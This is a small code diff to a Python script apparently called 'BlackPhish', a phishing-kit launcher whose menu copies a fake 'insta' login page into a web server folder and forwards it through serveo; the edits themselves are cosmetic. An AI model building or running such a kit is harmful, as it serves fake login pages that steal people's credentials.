@@ -6,7 +6,6 @@
 
 try:
 	import os
-	#subproccess
 
 except ImportError():
 	print("\033[31;1m" + "[!] Error importing")
@@ -46,7 +45,7 @@ def serveo_forward(): # Port forward to serveo#
 def main():  # Main script #
 
 	choice = input("[BlackPhish] -> ") # Get user input #
-
+ 
 	if choice == "1":
 		print(green + '[+] Copying Files')
 		os.system('cp ' + cwd + '/' + ' insta' '/var/www/html/')
@@ -69,7 +68,7 @@ def main():  # Main script #
 		#print('')
 
 	else:
-		print(red + "[!] Invalid option")
+		print(red + "[!] Invalid option" + reset)
 		main()
 
 
